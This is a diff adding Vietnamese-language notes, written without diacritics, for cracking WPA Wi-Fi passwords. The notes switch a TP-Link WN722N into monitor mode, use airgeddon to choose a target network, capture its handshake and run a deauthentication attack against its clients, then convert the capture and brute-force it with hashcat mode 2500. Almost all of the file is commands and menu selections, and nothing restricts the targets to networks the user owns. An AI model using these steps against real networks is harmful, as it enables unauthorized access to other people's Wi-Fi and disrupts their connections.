@@ -1,0 +1,62 @@
+CHAY CHE DO MONITOR MODE CHO USB WIFI TP-LINK WN722N-V3
+
+    1. Ket noi  TP-Link TL-WN722N
+    2. Chay leng sau:
+
+      sudo rmmod r8188eu.ko
+      sudo modprobe 8188eu
+
+    3. Rut usb ket noi lai ngay
+    4. Chay leng sau:
+
+      sudo ifconfig wlan0 down
+      sudo airmon-ng check kill
+      sudo iwconfig wlan0 mode monitor
+      sudo ifconfig wlan0 up
+      sudo iwconfig 
+
+
+LAY FILE .CAP
+
+    B1: Truy cap vao file chua airgeddon  (cd /home/kali/airgeddon)
+    B2: chay truong trinh airgeddon
+      sudo ./airgeddon.sh
+    B3: chon 2 (wlan0 // 2.4Ghz // Chipset: TP-Link TL-WN722N v2/v3)
+    B4: Put interface in monitor mode (chon2-vao che do monitor mode)
+    B5: Handshake/PMKID tools menu (chon 5)
+    B6: Explore for targets (monitor mode needed) (chon 4-quet tat ca cac mang)
+    B7:Chon muc tieu
+    B6: Capture Handshake (chon 6-lay file .cap)
+    B7: Deauth / disassoc amok mdk4 attack (chon 1-day use ra ngoai)
+    B8: dien thoi gian thuc hien
+    B9: dien noi luu file cap
+
+CHUYEN DOI .CAP SANG HCCAPX
+
+    B1: Truy cap vao file hashcat-utils
+    B2: chay hashcat-utils bang cach
+        cd /home/kali/hashcat-utils/src
+        ./cap2hccapx.bin URL/File.cap URL/File_save (chuyen doi sang file hccapx luu o duong dan URL/File_save)
+
+CRACK PASS BANG HASHCAT
+
+    B1: Chay qua trinh crack
+    hashcat -m 2500 URL/File_save -i --increment-min=<number> --increment-max=<number> -a 3 'Charset'
+
+      Trong do: URL/File_save: dia chi luu file .hccapx
+                --increment-min=<number>: ki tu min pass VD --increment-min=8;
+                --increment-max=<number>: ki tu min pass VD --increment-max=10;
+
+                Charset - Dinh dang pass
+                  ?l: abcdefghijklmnopqrstuvwxyz
+                  ?u: ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                  ?d: 0123456789
+                  ?h: 0123456789abcdef
+                  ?H: 0123456789ABCDEF
+                  ?s: !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+                  ?a: ?l?u?d?s
+                  ?b: 0x00 - 0xff
+
+    B2: in ket qua
+
+    hashcat -m 2500 URL/File_save -i --increment-min=<number> --increment-max=<number> -a 3 'Charset' --force --show
